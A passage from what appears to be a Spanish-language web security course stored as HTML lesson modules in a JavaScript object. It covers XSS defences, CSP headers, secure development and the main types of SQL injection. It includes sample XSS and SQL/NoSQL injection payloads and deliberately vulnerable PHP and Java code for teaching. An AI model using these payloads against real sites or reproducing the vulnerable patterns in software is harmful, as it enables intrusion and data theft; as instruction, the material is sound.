        <h3>Content Security Policy (CSP)</h3>
        <p>
          Es una cabecera que le indica al navegador qué fuentes de contenido puede cargar o ejecutar. Una configuración estricta (por ejemplo, solo permitir scripts propios y prohibir inline y eval) puede frenar muchos XSS porque aunque logre inyectarse un <code>&lt;script&gt;</code> o un <code>onerror</code>, el navegador no lo ejecutará si viola la política.
        </p>

        <div class="warning-box">
          <p><strong>Importante:</strong> CSP se considera una mitigación de segunda capa – es decir, uno no debe decir "no escapo porque tengo CSP", sino usarlo como respaldo por si algo se escapó.</p>
        </div>

        <h3>HttpOnly en cookies</h3>
        <p>
          Marcar las cookies de sesión como <code>HttpOnly</code> significa que JavaScript (incluso un script malicioso inyectado) no podrá leerlas desde <code>document.cookie</code>. Esto corta la posibilidad de robo de sesión directamente vía XSS.
        </p>

        <h3>Otros headers de seguridad</h3>
        <ul>
          <li><strong>X-Content-Type-Options: nosniff:</strong> puede prevenir que un atacante suba contenido interpretado como HTML/JS inadvertidamente</li>
          <li><strong>X-Frame-Options:</strong> evita que tu sitio sea embebido en iframes (reduce vectores de clickjacking que a veces se combinan con XSS)</li>
        </ul>

        <h2>Ejemplo de implementación integrada</h2>
        <p>Para aterrizar estas ideas, veamos un flujo "ideal" en una funcionalidad que maneja datos de usuario:</p>

        <h3>Caso: Una página de perfil de usuario</h3>
        <p>Donde el usuario puede actualizar su "estado" (como una frase de biografía corta) que luego se muestra en su perfil público.</p>

        <ol>
          <li><strong>Entrada:</strong> El usuario ingresa su estado en un formulario. En el servidor, validamos longitud (ej. máx 160 caracteres) y permitimos solo ciertos caracteres unicode. Si pasa validación, lo almacenamos en la base de datos tal cual.</li>
          
          <li><strong>Al mostrar (perfil público):</strong> El perfil toma el campo "estado" de la DB y lo inserta en la página. Al generar esa vista, aplicamos escape HTML antes de insertarlo en el DOM.</li>
          
          <li><strong>Capas adicionales:</strong> El sitio debería tener una política CSP que deshabilite eval y scripts inline. Y las cookies de sesión HttpOnly garantizan que, aunque se pudiera ejecutar un script, este no robe la sesión fácilmente.</li>
          
          <li><strong>Testing:</strong> Durante QA, alguien debería probar ingresando cosas como <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> en todos los campos de texto para verificar que no se ejecutan.</li>
        </ol>

        <pre><code class="language-php highlight-vulnerable">// Ejemplo de entrada peligrosa
$estado = "El mejor &lt;script&gt;alert(1)&lt;/script&gt; desarrollador";</code></pre>

        <pre><code class="language-php highlight-secure">// Al mostrar con escape
echo "&lt;p&gt;" . htmlspecialchars($estado, ENT_QUOTES, 'UTF-8') . "&lt;/p&gt;";
// Resultado: El mejor &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; desarrollador</code></pre>

        <p>
          Puede que el resultado luzca extraño para el usuario malicioso (verá su propio intento en texto), pero no causó daño.
        </p>

        <h2>Resumen</h2>
        <p>
          La prevención de XSS efectiva requiere un enfoque múltiple: validar temprano, escapar siempre, y sanitizar cuando sea necesario, usando las herramientas adecuadas en cada contexto. Además, complementamos con configuraciones de seguridad en el entorno (headers, cookies) para reducir el impacto si algo se escapa.
        </p>

        <p>
          Hemos visto ejemplos concretos de cómo implementar estas medidas y resaltado la importancia de apoyarnos en frameworks y librerías de confianza en lugar de intentar soluciones caseras propensas a error.
        </p>

        <p>
          En el siguiente módulo profundizaremos en Content Security Policy y cabeceras HTTP, que son componentes importantes de la estrategia de defensa en profundidad. Comprenderemos cómo CSP puede actuar como una red de seguridad contra XSS y otras amenazas, y cómo configurar cabeceras útiles en nuestras aplicaciones web para añadir capas adicionales de protección.
        </p>

        <p>
          Con las prácticas de codificación segura de este módulo y los mecanismos adicionales del próximo, estaremos bien preparados para construir aplicaciones robustas frente a XSS.
        </p>
      `
    },
    'csp-y-headers': {
      id: 'csp-y-headers',
      title: 'Content Security Policy y cabeceras HTTP',
      description: 'Aprende cómo aplicar Content Security Policy y otras cabeceras de seguridad para reforzar la protección de tu aplicación frente a ataques XSS.',
      category: 'xss',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          Además de escribir código seguro, los desarrolladores web tienen a su disposición configuraciones a nivel de servidor y navegador que sirven como última línea de defensa frente a ataques XSS y otros. En este módulo exploraremos las más destacadas: <strong>Content Security Policy (CSP)</strong> y otras cabeceras HTTP de seguridad. 
        </p>
        <p>
          CSP es una potente herramienta que controla qué tipo de contenido puede cargar o ejecutar una página, reduciendo significativamente las posibilidades de ejecución de scripts inyectados. También veremos cabeceras como <code>X-XSS-Protection</code> (legado), <code>X-Content-Type-Options</code> y la bandera <code>HttpOnly</code> en cookies.
        </p>

        <h2>Content Security Policy (CSP): ¿Qué es y por qué usarla?</h2>
        <p>
          <strong>Content Security Policy</strong> es un mecanismo de seguridad que se aplica mediante una cabecera HTTP o meta etiqueta HTML. Permite definir políticas sobre qué recursos puede cargar la página (scripts, estilos, imágenes, etc.). Su principal función frente a XSS es restringir la carga y ejecución de JavaScript no autorizado.
        </p>

        <h3>Directivas clave de CSP para XSS</h3>
        <ul>
          <li><strong>script-src:</strong> define de dónde se permiten cargar y ejecutar scripts. Se pueden indicar dominios (ej. <code>'self'</code> para el mismo origen) o usar restricciones como <code>'none'</code>, <code>'unsafe-inline'</code> (no recomendado) o <code>'unsafe-eval'</code>.</li>
          <li><strong>default-src:</strong> política por defecto para todos los tipos de contenido.</li>
          <li><strong>object-src:</strong> controla contenido plugin (como Flash). Se recomienda <code>'none'</code>.</li>
          <li><strong>base-uri:</strong> evita la reescritura maliciosa de URLs base.</li>
          <li><strong>form-action:</strong> restringe destinos de formularios.</li>
          <li><strong>frame-ancestors:</strong> evita que otros sitios incluyan tu página en iframes (clickjacking).</li>
        </ul>

        <div class="warning-box">
          <p><strong>Clave para mitigar XSS:</strong> prohibir contenido script inesperado, evitar inline scripts salvo uso de <em>nonce</em> o hash, y limitar <code>script-src</code> a dominios propios o de confianza.</p>
        </div>

        <h3>Ejemplo de política CSP estricta</h3>
        <pre><code class="language-http">Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; style-src 'self'; base-uri 'self'; form-action 'self'</code></pre>
        <p>Esta política bloquea scripts externos, contenido plugin y formularios hacia otros dominios.</p>

        <h3>Modo Report-Only</h3>
        <p>
          CSP puede configurarse en modo <code>Report-Only</code> para probar sin bloquear. En este modo, los navegadores informan violaciones a un endpoint pero no bloquean recursos. Es ideal para ajustar políticas antes de activarlas en producción.
        </p>

        <h3>Limitaciones y desafíos</h3>
        <ul>
          <li>Requiere conocer todos los recursos legítimos (scripts, CDNs, etc.).</li>
          <li>Scripts inline se bloquean si no se usa <code>'unsafe-inline'</code> o <code>nonce/hash</code>.</li>
          <li>Navegadores antiguos no soportan CSP.</li>
          <li>No protege si un atacante inyecta scripts desde un origen permitido.</li>
        </ul>

        <h2>Cómo enviar CSP</h2>
        <h3>En Apache</h3>
        <pre><code class="language-apache">&lt;IfModule mod_headers.c&gt;
      Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; style-src 'self';"
    &lt;/IfModule&gt;</code></pre>

        <h3>En Express (Node.js)</h3>
        <pre><code class="language-js">res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self'; object-src 'none';");</code></pre>

        <h3>Meta etiqueta HTML</h3>
        <pre><code class="language-html">&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';"&gt;</code></pre>
        <p>Útil cuando no se pueden modificar cabeceras HTTP, aunque con limitaciones.</p>

        <h2>Otras cabeceras de seguridad relevantes</h2>
        <ul>
          <li><strong>X-XSS-Protection:</strong> activaba el filtro XSS nativo de algunos navegadores (ahora obsoleto). Se recomienda desactivarlo con <code>X-XSS-Protection: 0</code> si ya usas CSP.</li>
          <li><strong>X-Content-Type-Options: nosniff</strong> evita que el navegador “adivine” tipos de contenido erróneos, previniendo ejecución de archivos subidos maliciosamente.</li>
          <li><strong>X-Frame-Options:</strong> previene que tu sitio sea embebido en iframes (clickjacking).</li>
          <li><strong>Set-Cookie con HttpOnly y Secure:</strong> asegura cookies sensibles contra acceso vía JavaScript y solo en HTTPS.</li>
          <li><strong>Referrer-Policy y Permissions-Policy:</strong> controlan privacidad y APIs disponibles en la página.</li>
        </ul>

        <h2>Ejemplo práctico: Implementando CSP paso a paso</h2>
        <ol>
          <li>Revisar las fuentes de scripts legítimos (propios, jQuery CDN, Google Analytics, etc.).</li>
          <li>Empezar con modo <code>Report-Only</code> para detectar violaciones.</li>
          <li>Corregir scripts inline moviéndolos a archivos o usando nonce.</li>
          <li>Pasar a modo enforcement (<code>Content-Security-Policy</code>).</li>
          <li>Ajustar excepciones puntuales (widgets de terceros, etc.).</li>
          <li>Verificar que los payloads XSS ya no se ejecuten.</li>
        </ol>

        <pre><code class="language-http">Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' https://code.jquery.com https://www.google-analytics.com; object-src 'none'; style-src 'self' 'unsafe-inline';</code></pre>

        <h2>Resumen</h2>
        <p>
          <strong>Content Security Policy</strong> actúa como un guardia del navegador que refuerza la seguridad ante XSS y otras amenazas. No reemplaza las validaciones o escapes del lado servidor, pero complementa tu defensa en profundidad junto a cabeceras como <code>HttpOnly</code> y <code>nosniff</code>.
        </p>
        <p>
          En este módulo aprendimos qué es CSP, cómo configurarla y cuáles son sus limitaciones, junto con otras cabeceras de seguridad esenciales. En el siguiente módulo veremos cómo integrar estas prácticas en el ciclo de desarrollo seguro.
        </p>
      `
    },
    'diseno-seguro-y-procesos': {
      id: 'diseno-seguro-y-procesos',
      title: 'Diseño seguro y ciclo de desarrollo',
        description: 'Descubre cómo integrar medidas de seguridad contra XSS en cada etapa del desarrollo, desde el diseño hasta las revisiones de código.',
        category: 'xss',
        htmlContent: `
          <h2>Introducción</h2>
          <p>
            La prevención de vulnerabilidades como XSS no se logra con parches puntuales, sino incorporando principios de <strong>diseño seguro</strong> a lo largo de todo el SDLC. En este módulo abordamos la seguridad —especialmente la prevención de XSS— desde la planificación, implementación, pruebas y mantenimiento.
          </p>
          <p>
            Veremos prácticas como revisión de código con foco en seguridad, pruebas de penetración internas, uso de herramientas automáticas (SAST/DAST), capacitación del equipo y selección de frameworks que reduzcan la probabilidad de XSS. El objetivo es que la seguridad sea un hábito constante y no un pensamiento de último momento.
          </p>

          <h2>Incorporando seguridad desde el diseño</h2>
          <p><strong>Security by Design</strong> implica considerar amenazas y controles en la fase de arquitectura, no después.</p>
          <ul>
            <li><strong>Modelado de amenazas temprano:</strong> Para cada entrada de usuario en requisitos, anota posibles amenazas (XSS, SQLi) y contramedidas (validación, escape, sanitizado). Metodologías como <em>STRIDE</em> ayudan a categorizar. Cualquier funcionalidad que muestre contenido de usuarios merece atención especial.</li>
            <li><strong>Políticas y requisitos de seguridad:</strong> Define requisitos no funcionales: “sanitizar todo input antes de renderizar”, “implementar CSP”, “no usar <code>eval</code>”, etc.</li>
            <li><strong>Elección de tecnologías seguras:</strong> Prefiere frameworks que auto-escapen (Django, Rails) y frontends que escapen salida por defecto (React, Angular, Vue). Evita generar HTML por concatenación de strings.</li>
            <li><strong>Principio de mínima exposición:</strong> Si no necesitas interpretar HTML de usuarios, no lo permitas. Menos superficies interpretables = menor riesgo.</li>
          </ul>
          <p>Adoptar seguridad desde fases tempranas evita errores comunes que llevan a XSS y reduce costos de corrección.</p>

          <h2>Buenas prácticas en la implementación (codificación segura)</h2>
          <ul>
            <li><strong>Nunca</strong> construyas HTML por concatenación sin sanitizar; usa plantillas seguras o APIs del DOM seguras.</li>
            <li><strong>Centraliza escapes/sanitizado:</strong> Crea/utiliza utilidades consistentes (<code>escapeHtml()</code>, <code>escapeAttr()</code>, etc.; OWASP ESAPI es una opción multi-lenguaje).</li>
            <li><strong>Code reviews con foco en XSS:</strong> Checklist: ¿la vista escapa datos? ¿el endpoint filtra lo que el cliente insertará en el DOM? ¿se evita <code>dangerouslySetInnerHTML</code> en React?</li>
            <li><strong>Comentarios y documentación:</strong> Señala puntos sensibles (<code>// WARNING: input sanitizado por X</code>).</li>
            <li><strong>Plantillas backend:</strong> No deshabilites el auto-escape salvo casos muy justificados; mejor usar sanitizadores para HTML permitido.</li>
            <li><strong>No ignores linters/analizadores:</strong> ESLint (plugins de seguridad), SonarQube, etc. No silencies alertas sobre <code>innerHTML</code>, <code>document.write</code>, etc.</li>
            <li><strong>Bibliotecas de terceros:</strong> Evita libs no mantenidas que toquen el DOM. Si usas WYSIWYG, revisa su sanitización y mantén versiones actualizadas.</li>
          </ul>
          <p>Muchas organizaciones crean <em>Guías de codificación segura</em> para estandarizar estas prácticas.</p>

          <h2>Verificación y pruebas de seguridad</h2>
          <p>No basta con creer que el código es seguro; hay que probarlo.</p>
          <ul>
            <li><strong>Testing manual (pentesting interno):</strong> Incluye casos maliciosos: intenta <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, <code>&lt;img onerror=alert(1) src=x&gt;</code>, <code>"&gt;&lt;svg/onload=alert(1)&gt;</code> y verifica que no se ejecuten.</li>
            <li><strong>Herramientas DAST:</strong> OWASP ZAP, Burp Suite pueden detectar XSS reflejados/almacenados. Integra scans en pruebas.</li>
            <li><strong>Análisis estático (SAST):</strong> Coverity, Checkmarx, SonarQube. Configura reglas para trazar de <em>sources</em> a <em>sinks</em> sin sanitizado.</li>
            <li><strong>Ciclo de retroalimentación:</strong> Al encontrar una vulnerabilidad, corrige y analiza la causa raíz; ajusta procesos (reglas, revisiones) para evitar reincidencia.</li>
            <li><strong>Concientización:</strong> Mantén al equipo al día sobre nuevas técnicas (p. ej., vectores DOM, Unicode tricky, XSS polimórfico).</li>
          </ul>

          <h2>Mantenimiento y despliegue seguro</h2>
          <ul>
            <li><strong>Parches y dependencias:</strong> Actualiza componentes susceptibles (frameworks, editores, libs DOM) ante parches XSS.</li>
            <li><strong>Monitorización:</strong> Usa CSP con <em>report-uri/report-to</em> para recibir violaciones. Vigila logs del servidor.</li>
            <li><strong>Plan de respuesta:</strong> Identifica vector, corrige, invalida sesiones si procede, notifica si es necesario y revisa integridad post-incidente.</li>
            <li><strong>Bug bounty / investigación externa:</strong> Programas de recompensas pueden destapar casos límite.</li>
            <li><strong>CI/CD seguro:</strong> Incluye SAST en cada push, pruebas de seguridad automatizadas y secciones de “impacto en seguridad” en PRs.</li>
            <li><strong>Mejora continua:</strong> Comparte hallazgos (p. ej., DOM clobbering) y audita el código por posibles impactos.</li>
          </ul>

          <h2>Frameworks modernos y SPAs (consideraciones)</h2>
          <ul>
            <li><strong>Endurecer funciones peligrosas:</strong> En Angular, el binding <code>[innerHTML]</code> sanitiza por defecto; audita cualquier <code>bypassSecurityTrust*</code>. En React, evita <code>dangerouslySetInnerHTML</code> con contenido de usuarios. En Vue, usa <code>v-html</code> solo con HTML previamente sanitizado.</li>
            <li><strong>Trusted Types:</strong> Planifica su adopción si haces mucha manipulación del DOM. Prevenirá asignaciones inseguras a <code>innerHTML</code> y similares.</li>
            <li><strong>APIs de terceros:</strong> Prefiere SDKs oficiales, evita insertar HTML de orígenes no verificados.</li>
          </ul>

          <h2>Resumen</h2>
          <p>
            La seguridad —incluida la protección contra XSS— debe acompañar todo el ciclo de vida: planificar amenazas, codificar con prácticas seguras, probar con casos maliciosos, desplegar con defensas adicionales y mantener vigilancia y actualización constante.
          </p>
          <p>
            Con esta mentalidad de SDLC seguro, reducimos drásticamente la probabilidad de introducir XSS. En el siguiente (y último) módulo exploraremos <strong>casos avanzados de XSS</strong> para completar el panorama defensivo.
          </p>
        `
    },
    'casos-avanzados-xss': {
      id: 'casos-avanzados-xss',
      title: 'Casos avanzados de XSS',
      description: 'Analiza escenarios complejos como aplicaciones SPA, uso de terceros y editores enriquecidos, y cómo adaptar las defensas a entornos modernos.',
      category: 'xss',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          A pesar de todas las protecciones vistas, los investigadores siguen encontrando formas novedosas de explotar XSS. 
          En este módulo revisamos casos avanzados: evasión de filtros, vectores inusuales (p. ej., SVG), ataques combinados (XSS + CSRF) 
          y aprovechamiento de debilidades en navegadores o frameworks. El objetivo es ampliar la perspectiva defensiva. 
          <em>Nota: Este contenido es educativo; comprenderlo ayuda a defender mejor nuestras aplicaciones.</em>
        </p>

        <h2>Polimorfismo y evadiendo filtros ingenuos</h2>
        <p>
          Las listas negras simples (p. ej., eliminar la cadena <code>script</code>) suelen fallar. Trucos comunes:
        </p>
        <ul>
          <li><strong>Mayúsculas/minúsculas:</strong> HTML no distingue caso en etiquetas; <code>&lt;ScRiPt&gt;</code> sigue siendo válido.</li>
          <li><strong>Codificaciones alternativas:</strong> Entidades HTML (<code>&amp;lt;script&amp;gt;</code>) o hex (<code>\\x3cscript\\x3e</code>) evaden filtros literales.</li>
          <li><strong>Cortes en múltiples entradas:</strong> Concatenar partes como <code>&lt;scr</code> + <code>ipt&gt;</code> para evadir reglas simples.</li>
          <li><strong>Otras etiquetas ejecutables:</strong> <code>&lt;img onerror&gt;</code>, <code>&lt;iframe src="javascript:"&gt;</code>, <code>&lt;svg onload&gt;</code>, <code>&lt;math&gt;</code>, <code>&lt;body onload&gt;</code>, etc.</li>
          <li><strong>Payloads polivalentes (polyglots):</strong> Diseñados para ejecutarse en varios contextos, p. ej. <code>"&gt;&lt;svg onload=alert(1)&gt;</code>.</li>
        </ul>
        <p>
          En síntesis: confía en <strong>lista blanca</strong> y <strong>escape contextual</strong>, no en listas negras. 
          Un caso histórico fue XSS vía <em>UTF-7</em> en IE por mala declaración de charset.
        </p>

        <h2>XSS en archivos y formatos inesperados</h2>
        <ul>
          <li><strong>SVG:</strong> Es XML renderizable con soporte de scripts. Un SVG subido con <code>&lt;script&gt;</code> puede ejecutarse si se sirve con <code>image/svg+xml</code>. Mitiga sanitizando SVG o sirviéndolo como contenido no activo.</li>
          <li><strong>PDF/Flash:</strong> Históricamente permitieron JS en ciertos escenarios; Flash está extinto en la web moderna, pero fue un vector.</li>
          <li><strong>JSON mal interpretado (JSONP, MIME erróneo):</strong> Respuestas tratadas como script (p. ej., <code>&lt;script src="...callback=&lt;payload&gt;"&gt;</code>) pueden llevar a XSS. Usa MIME correcto y evita JSONP.</li>
          <li><strong>XSS persistente de segundo orden:</strong> El payload se ejecuta después en otro flujo (p. ej., en un reporte HTML de un admin). Sanitiza consistentemente todos los usos de datos almacenados.</li>
        </ul>

        <h2>Ataques combinados con XSS</h2>
        <ul>
          <li><strong>XSS + CSRF:</strong> Con XSS, el atacante puede enviar peticiones en nombre de la víctima (<code>fetch('/api/deleteAccount')</code>). Tokens CSRF siguen añadiendo fricción, aunque XSS suele poder leerlos salvo cookies <code>HttpOnly</code>.</li>
          <li><strong>Ransomware/ataques locales:</strong> Demostraciones académicas han ido más allá del navegador (p. ej., Rowhammer vía JS); escenarios raros pero ilustrativos.</li>
          <li><strong>Robo masivo de datos/XS-Leaks:</strong> XSS puede facilitar reconocimiento interno, exfiltración y técnicas colaterales.</li>
          <li><strong>Auto-propagación (worms):</strong> XSS almacenado que se replica (caso Samy en MySpace). En apps colaborativas modernas, el riesgo persiste.</li>
        </ul>

        <h2>XSS en entornos modernos (SPA, SSR, etc.)</h2>
        <ul>
          <li><strong>SPA:</strong> React/Angular/Vue escapan por defecto, pero han existido escapes (p. ej., antiguas técnicas en AngularJS 1.x como <code>{{constructor.constructor('alert(1)')()}}</code> si se imprimían expresiones de usuario sin control).</li>
          <li><strong>SSR + hidratación:</strong> Si el HTML inicial incluye atributos <code>on*</code> inyectados por falta de escape en SSR, la hidratación puede asumir legitimidad y no re-sanitizar.</li>
          <li><strong>Cadena de suministro:</strong> Dependencias comprometidas (NPM/PyPI) pueden introducir XSS o robo de datos. Audita, fija versiones y minimiza confianza ciega.</li>
        </ul>

        <h2>Ejemplo ilustrativo avanzado: ataque usando &lt;base&gt;</h2>
        <p>
          La etiqueta <code>&lt;base href&gt;</code> define la URL base de recursos relativos. Inyectarla en <code>&lt;head&gt;</code> puede redirigir cargas de scripts/estilos a dominios del atacante, facilitando XSS en ciertas condiciones. 
          Es difícil inyectar en <code>&lt;head&gt;</code>, pero ejemplifica la creatividad de los vectores.
        </p>

        <h2>Lecciones aprendidas de casos avanzados</h2>
        <ul>
          <li>No subestimar a los atacantes: apuntan a los resquicios.</li>
          <li>XSS aparece en lugares no obvios (archivos, transformaciones intermedias, componentes externos).</li>
          <li>Aprendizaje continuo: la seguridad evoluciona; lo raro hoy puede ser común mañana.</li>
          <li>Defensa en profundidad: múltiples capas (escape, sanitización, CSP, cookies <code>HttpOnly</code>, etc.) limitan el impacto si una falla.</li>
        </ul>

        <h2>Resumen</h2>
        <p>
          Exploramos las fronteras de XSS: evasión de filtros, contextos no habituales y combinaciones con otras vulnerabilidades. 
          Vimos <strong>SVG malicioso</strong>, <strong>second-order XSS</strong>, <strong>worms</strong> y debilidades históricas en frameworks. 
          La conclusión: implementar todas las precauciones y mantenerse actualizado.
        </p>
        <p>
          La seguridad es un proceso continuo. Con buenas prácticas de codificación, políticas sólidas, un SDLC con foco en seguridad y vigilancia constante, 
          estaremos mejor equipados para defender nuestras aplicaciones ante amenazas conocidas y emergentes.
        </p>

        <h2>Resumen final del curso</h2>
        <p>
          A lo largo de estos módulos cubrimos fundamentos de XSS, tipos principales, importancia del contexto al escapar, DOM XSS, 
          prevención integral, el papel de CSP y cabeceras, integración de seguridad en el ciclo de desarrollo y, finalmente, casos avanzados. 
          Con este conocimiento podrás diseñar y desarrollar aplicaciones robustas, evitar errores comunes y responder a desafíos de seguridad con enfoque ético y didáctico.
        </p>
      `
    },
    'fundamentos-sqli': {
      id: 'fundamentos-sqli',
      title: 'Fundamentos de inyección SQL',
      description: 'Aprende qué es la inyección SQL, cómo un dato no confiable puede alterar una consulta y qué impactos puede tener sobre la confidencialidad e integridad de la base de datos.',
      category: 'sqli',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          La inyección SQL es una vulnerabilidad que permite introducir comandos SQL maliciosos a través de una aplicación, alterando la consulta que ejecuta la base de datos.
          Sucede cuando datos de usuario se insertan en sentencias SQL sin validación o separación adecuada entre <em>código</em> y <em>datos</em>.
        </p>
        <p>
          En este módulo revisamos qué es una consulta SQL, cómo las aplicaciones la construyen y qué pasa cuando un atacante logra manipularla.
          Estas bases preparan el terreno para módulos posteriores.
        </p>

        <h2>Explicación</h2>
        <p>Ejemplo de consulta legítima:</p>
        <pre><code class="language-sql">SELECT *
    FROM products
    WHERE category = 'Garden' AND released = 1;</code></pre>

        <p>Construcción insegura en Java (concatenación directa de entrada):</p>
        <pre><code class="language-java">String category = request.getParameter("category");
    String query = "SELECT * FROM products WHERE category = '" + category + "' AND released = 1";
    Statement stmt = connection.createStatement();
    ResultSet results = stmt.executeQuery(query);</code></pre>

        <p>Un atacante podría invocar:</p>
        <pre><code class="language-text">https://sitio-inseguro.com/products?category=Garden'--</code></pre>

        <p>Consulta resultante:</p>
        <pre><code class="language-sql">SELECT * FROM products WHERE category = 'Garden'--' AND released = 1;</code></pre>

        <p>
          El <code>--</code> inicia un comentario, truncando la parte restante y modificando la lógica.
          En escenarios sensibles (autenticación, datos privados) el impacto es crítico.
        </p>

        <div class="warning-box">
          <p><strong>Idea clave:</strong> La base de datos no sabe qué parte del string es código o datos; ejecuta todo. El atacante cierra comillas o añade cláusulas (<code>' OR '1'='1</code>, <code>; DROP TABLE ...; --</code>) para cambiar la consulta.</p>
        </div>

        <h2>Impacto</h2>
        <ul>
          <li>Lectura de datos sensibles (de otros usuarios o del sistema).</li>
          <li>Modificación o borrado de registros; escalamiento de privilegios.</li>
          <li>Compromiso del servidor de BD o incluso del SO en entornos mal configurados.</li>
          <li>Incidentes de alto perfil han expuesto millones de registros debido a SQLi.</li>
        </ul>

        <h2>Ejemplos vulnerables</h2>
        <h3>Ejemplo 1 – Autenticación vulnerable (PHP)</h3>
        <pre><code class="language-php">$username = $_POST['user'];
    $password = $_POST['pass'];
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = mysqli_query($conn, $query);</code></pre>
        <p>
          Usuario: <code>admin'--</code> &rarr; La contraseña queda comentada y podría otorgar acceso no autorizado.
        </p>

        <h3>Ejemplo 2 – Búsqueda vulnerable (JavaScript/NoSQL)</h3>
        <pre><code class="language-js">// Entrada:
    let username = req.body.user; // "invent"
    db.collection('accounts').find({ username: username });</code></pre>
        <p>
          Si el atacante envía <code>{"$ne": null}</code> (o <code>username[$ne]=null</code>), la condición se vuelve siempre verdadera y puede devolver todos los usuarios
          (inyección NoSQL por operadores especiales).
        </p>

        <h2>Ejemplos seguros</h2>
        <h3>Solución 1 – Autenticación segura (PHP con PDO)</h3>
        <pre><code class="language-php">$username = $_POST['user'];
    $password = $_POST['pass'];
    $sql = "SELECT * FROM users WHERE username = :user AND password = :pass";
    $stmt = $pdo->prepare($sql);
    $stmt->execute(['user' => $username, 'pass' => $password]);
    $result = $stmt->fetchAll();</code></pre>
        <p>
          Los parámetros <code>:user</code> y <code>:pass</code> separan datos del código SQL, neutralizando comillas, comentarios y agregados maliciosos.
        </p>

        <h3>Solución 2 – Búsqueda segura (Validación en NoSQL)</h3>
        <pre><code class="language-js">let username = req.body.user;
    if (typeof username !== 'string' || username.match(/[$]/)) {
      throw new Error("Entrada de usuario no válida");
    }
    db.collection('accounts').find({ username });</code></pre>
        <p>
          Valida tipo y formato, bloqueando operadores (<code>$ne</code>, etc.). Idealmente usa APIs/ORM que parametrizan internamente.
        </p>

        <div class="info-box">
          <p><strong>Regla de oro:</strong> Parametriza consultas siempre que sea posible. Para elementos estructurales (p. ej., nombres de tabla) usa listas blancas o rediseña.</p>
        </div>

        <h2>Errores comunes</h2>
        <ul>
          <li>Concatenar strings para armar SQL.</li>
          <li>No validar datos de entrada (p. ej., id no numéricos que inyectan <code>OR 1=1</code>).</li>
          <li>Exponer mensajes de error detallados al usuario (filtración de pistas).</li>
          <li>Usar credenciales de BD con privilegios excesivos (root/admin).</li>
          <li>Creer que NoSQL/ORMs modernos son inmunes si se usan con concatenación manual.</li>
        </ul>

        <h2>Buenas prácticas</h2>
        <ul>
          <li><strong>Parametriza siempre:</strong> Prepared Statements en Java, <code>SqlCommand</code> con parámetros en .NET, PDO/MySQLi en PHP, drivers/ORM en Python, etc.</li>
          <li><strong>Valida entrada en servidor:</strong> Tipos correctos, rangos y listas blancas de caracteres.</li>
          <li><strong>Gestiona errores:</strong> Registra detalles en servidor; muestra mensajes genéricos al usuario.</li>
          <li><strong>Mínimo privilegio en BD:</strong> Cuentas con permisos estrictamente necesarios.</li>
          <li><strong>Actualiza software y usa ORM correctamente:</strong> Evita SQL nativo concatenado; si es necesario, usa parámetros del ORM/driver.</li>
        </ul>

        <h2>Resumen</h2>
        <p>
          La inyección SQL explota la mezcla insegura de datos y código en consultas. Vimos cómo entradas maliciosas alteran SQL y cómo prevenirlo mediante
          <strong>consultas parametrizadas</strong>, <strong>validación</strong>, manejo cuidadoso de errores y <strong>mínimo privilegio</strong>.
          Estas bases preparan para profundizar en tipos de inyección y defensas avanzadas.
        </p>
      `
    },
    'tipos-sqli': {
      id: 'tipos-sqli',
      title: 'Tipos de inyección SQL',
      description: 'Conoce las familias principales de Inyección SQL: in-band, inferencial (blind) y out-of-band, y entiende cómo difieren en visibilidad y método de explotación.',
      category: 'sqli',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          No todas las inyecciones SQL son iguales; existen diferentes técnicas según el contexto.
          En este módulo exploramos las principales variantes y sus características: inyecciones <strong>en banda</strong> (feedback directo),
          <strong>ciegas/inferenciales</strong> (sin revelar datos de forma explícita) y <strong>fuera de banda (OOB)</strong>, además de UNION y segundo orden.
          Comprenderlas ayuda a reconocer patrones de ataque y a diseñar defensas más completas.
        </p>

        <h2>Explicación</h2>

        <h3>1. Inyección SQL Clásica (En Banda)</h3>
        <p>
          El atacante inserta SQL malicioso y obtiene resultados por el mismo canal (la misma respuesta web).
          Es la más visible: aparecen datos inesperados o errores SQL en la UI.
          Ejemplos típicos: <code>OR '1'='1</code>, <code>; DROP TABLE users;--</code> o el caso de autenticación del módulo previo (<code>admin'--</code>).
        </p>

        <h3>2. Inyección SQL Basada en Errores</h3>
        <p>
          Se aprovechan mensajes de error detallados para extraer información (estructuras, nombres de columnas, valores).
          Por ejemplo, forzar <code>UNION SELECT columna_inexistente</code> para provocar un error que revele metadatos.
          Sigue siendo <em>en banda</em> porque la información vuelve en la misma respuesta HTTP.
        </p>

        <h3>3. Inyección SQL Ciega (Booleana)</h3>
        <p>
          No hay salida directa ni errores útiles. El atacante formula preguntas de <em>Sí/No</em> y observa cambios en la respuesta.
          Ejemplo: <code>?id=5 AND 1=1</code> vs <code>?id=5 AND 1=0</code> para inferir condiciones;
          después, consultas como <code>SUBSTRING((SELECT usuario FROM usuarios LIMIT 1),1,1)='a'</code> permiten reconstruir datos carácter a carácter.
        </p>

        <h3>4. Inyección SQL Ciega Basada en Tiempo</h3>
        <p>
          Se infiere por retrasos en la respuesta usando funciones como <code>SLEEP()</code> (MySQL),
          <code>WAITFOR DELAY</code> (SQL Server) o <code>pg_sleep()</code> (PostgreSQL).
          Si una condición es verdadera, la respuesta tarda más; si es falsa, responde rápido. Así se extrae información de forma silenciosa.
        </p>

        <h3>5. Inyección SQL Basada en UNION</h3>
        <p>
          Usa <code>UNION</code> para combinar resultados de consultas y volcar datos de otras tablas en la respuesta legítima.
          Requiere alinear número y tipos de columnas (técnicas: <code>ORDER BY 1..N</code> para descubrir columnas; luego <code>UNION SELECT</code>).
          Muy eficaz para exfiltrar información en una sola respuesta.
        </p>

        <h3>6. Inyección SQL Fuera de Banda (OOB)</h3>
        <p>
          Cuando el canal normal no sirve (no hay feedback ni tiempos fiables), se usan canales alternativos (DNS/HTTP saliente) desde la base de datos.
